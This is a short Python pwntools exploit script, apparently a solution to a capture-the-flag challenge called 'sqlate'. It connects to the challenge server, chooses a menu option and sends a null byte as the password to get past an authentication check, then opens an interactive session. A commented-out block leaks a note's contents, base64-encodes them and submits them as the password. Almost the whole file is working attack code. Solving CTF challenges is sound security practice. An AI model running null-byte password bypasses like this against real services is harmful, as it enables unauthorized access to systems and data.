from pwn import *
import base64 as b

#io = process("./vuln")
io = remote("sqlate.chal.irisc.tf", 10000)
'''
for i in range(0xff):
    if i == 0 or i == 10:
        continue
'''
io.sendlineafter(b">", b"5")
io.sendlineafter(b"Password?:", b"\x00")


'''
io.sendlineafter(b">", b"2")
io.sendlineafter(b">", b"1")
io.sendlineafter(b"Title:", b"deez")

io.sendlineafter(b">", b"3")
io.sendlineafter(b"Title:", b"deez")
io.recvuntil(b"Language: ")

buf = io.recvline()
print(b"What the physics: " + buf)
buf = buf[:buf.index(b"Content")]
print(b"What the physics: " + buf)
buf = b.b64encode(buf)
print(buf)

io.sendlineafter(b">", b"5")
io.sendlineafter(b"Password?:", buf)
'''
io.interactive()
